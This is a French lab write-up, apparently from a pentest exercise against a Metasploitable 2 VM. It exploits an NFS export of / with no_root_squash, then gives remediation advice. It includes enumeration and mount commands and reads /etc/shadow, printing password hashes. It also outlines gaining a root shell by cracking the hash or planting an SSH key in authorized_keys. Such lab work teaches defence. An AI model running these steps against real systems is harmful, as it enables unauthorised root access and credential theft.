NFS — export racine en no_root_squash

Racine exportée à tous : accès root au filesystem distant sans exploit

Service / PortNFS — port 2049 (via rpcbind 111)
CibleMetasploitable 2 — 192.168.56.101
FaiblesseExport / * en lecture/écriture avec no_root_squash
RésultatAccès root au filesystem cible (lecture de /etc/shadow, du home de root)
Testé parZANNOU Josaphat

1. Identification — énumération RPC puis NFS

NFS partage des répertoires sur le réseau et s'appuie sur le portmapper RPC (port 111). On interroge d'abord rpcbind pour cartographier les services RPC et leurs ports réels (souvent dynamiques, invisibles à un scan de ports classique) :

$ rpcinfo -p 192.168.56.101
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100003    2,3,4 tcp 2049  nfs
    100005    1,2,3 tcp 41969 mountd
    100021   1,3,4 tcp 50825  nlockmgr
    100024    1   tcp  37243  status

Le service nfs est présent sur 2049. On liste alors les répertoires exportés :

$ showmount -e 192.168.56.101
Export list for 192.168.56.101:
/ *
/ * : la racine entière du système est exportée à toutes les adresses (*). Associée à no_root_squash, cette configuration donne un accès root distant sans authentification.

2. Démarche d'exploitation — montage et no_root_squash

Le montage NFS nécessite les droits root locaux (sur Kali). On monte la racine distante :

$ sudo mount -t nfs -o vers=3 192.168.56.101:/ /tmp/nfs_ms2
$ mount | grep nfs_ms2
192.168.56.101:/ on /tmp/nfs_ms2 type nfs (rw,relatime,vers=3,...,addr=192.168.56.101)

Comme l'export est en no_root_squash, notre root local est traité comme le root de la cible : on lit des fichiers normalement réservés à root, à commencer par /etc/shadow :

$ sudo head -5 /tmp/nfs_ms2/etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::

$ sudo ls -la /tmp/nfs_ms2/root
drwx------  2 root root  ... .ssh
-rw-------  1 root root  ... .rhosts
-rwx------  1 root root  ... reset_logs.sh
...

La lecture de /etc/shadow (fichier root:shadow, interdit à tout utilisateur normal) et l'accès au home de root prouvent l'accès root au filesystem distant.

3. Preuve d'accès obtenu

Trois éléments établissent la compromission : montage NFS rw de la racine distante, lecture du hash root dans /etc/shadow (root:$1$/avpfBJ1$...), et accès complet au home de root (.ssh, .rhosts). L'escalade vers un shell root est ensuite triviale : casser le hash récupéré, ou déposer une clé publique dans /root/.ssh/authorized_keys via le montage et se connecter en SSH root sans mot de passe.

4. Remédiation

RECOMMANDATIONS
  • Ne jamais exporter / ; limiter les exports au strict répertoire nécessaire.
  • Restreindre les exports à des hôtes nommés (jamais *), en lecture seule (ro) quand c'est possible.
  • Conserver root_squash (le défaut sûr) pour que le root distant soit mappé sur un compte sans privilège — no_root_squash est à proscrire.
  • Filtrer l'accès RPC/NFS (ports 111 et 2049) au pare-feu, hors réseau de confiance.
